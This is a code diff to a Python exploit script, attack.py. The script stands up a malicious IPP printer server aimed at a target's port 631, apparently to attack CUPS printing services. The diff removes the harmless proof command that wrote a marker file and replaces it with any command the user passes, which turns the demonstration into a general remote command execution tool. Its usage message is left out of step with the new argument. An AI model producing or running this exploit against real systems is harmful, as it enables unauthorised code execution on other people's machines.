@@ -184,7 +184,7 @@ def run_server(server):
     sys.exit(1)
 
 if __name__ == "__main__":
-    if len(sys.argv) < 3:
+    if len(sys.argv) < 4:
         print(f"Argument missing, try with: python attack.py <LOCAL_HOST> <TARGET_HOST>")
         quit()
 
@@ -192,10 +192,10 @@ if __name__ == "__main__":
     SERVER_PORT = 111
     TARGET_HOST = sys.argv[2]
     TARGET_PORT = 631
-    command = "echo This machine has been attacked > /tmp/ATTACKED"
+    COMMAND = sys.argv[3]
     
     server = IPPServer((SERVER_HOST, SERVER_PORT),
-                       IPPRequestHandler, MaliciousPrinter(command))
+                       IPPRequestHandler, MaliciousPrinter(COMMAND))
 
     threading.Thread(target=run_server, args=(server, )).start()
 
